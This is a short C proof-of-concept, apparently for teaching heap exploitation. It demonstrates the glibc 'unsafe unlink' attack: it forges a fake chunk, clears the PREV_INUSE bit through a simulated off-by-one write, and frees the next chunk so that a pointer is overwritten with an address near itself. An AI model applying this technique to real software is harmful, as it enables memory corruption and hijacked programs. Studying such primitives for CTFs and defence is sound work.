#include <stdio.h>
#include <stdlib.h>

int main(){
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    char* array[5];
    array[3]=malloc(0x98);
    array[4]=malloc(0x4f0);
    malloc(0x10);
    printf("array[3] %p\n",array[3]);
    *(long*)(array[3])=0;
    *(long*)(array[3]+8)=0x91;
    *(long*)(array[3]+16)=&array[0]; //fd
    *(long*)(array[3]+24)=&array[1]; //bk
    *(long*)(array[3]+0x90)=0x90; //chunk2 presize
    // edit chunk1
    *(array[3]+0x98)=0; //change preinuse
    //off by one
    free(array[4]);
    // FD->bk = BK;							      
    // BK->fd = FD;
    // change array[3]=fd==&array[0]
    printf("&array[0] %p\n",&array[0]);
    printf("array[3] %p\n",array[3]);
    return 0;
}